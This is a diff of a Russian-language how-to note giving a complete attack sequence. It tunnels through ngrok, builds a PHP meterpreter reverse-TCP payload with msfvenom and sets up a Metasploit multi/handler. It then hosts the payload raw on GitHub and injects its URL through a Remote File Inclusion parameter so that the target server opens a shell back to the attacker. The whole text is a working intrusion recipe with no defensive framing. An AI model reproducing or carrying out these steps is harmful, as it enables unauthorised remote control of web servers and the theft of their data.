@@ -16,8 +16,23 @@ Forwarding   tcp://6.tcp.eu.ngrok.io:15089 -> localhost:4444
 3) LHOST=6.tcp.eu.ngrok.io  LPORT=15089
 4) msfvenom -p php/meterpreter_reverse_tcp LHOST=6.tcp.eu.ngrok.io LPORT=15089 -f raw > global_meterpreter_reverse_tcp.php 
 
+Работа с meterpreter:
+1) msfconsole
+2) use exploit/multi/handler
+3) set payload php/meterpreter_reverse_tcp
+4) set LHOST localhost
+5) set LPORT 4444
+6) run
+
 Как работать с payloadom:
 1) Тыкаем на скрипт
 2) Нажимаем Raw
 3) Копируем ссылку из адресной строки
 4) Вставляем в RFI (к примеру: .....?file=url ссылка на наш GitHub код)
+
+P.s. Сначала запускаем metasploit потом вставляем ссылку на скрипт и перезагружаем страницу.
+Последовательность действий:
+1) создаём payload (полезную нагрузку)
+2) загружаем её на сервер или github
+3) настраиваем и запускаем metasploit 
+4) вставляем ссылку и rfi 
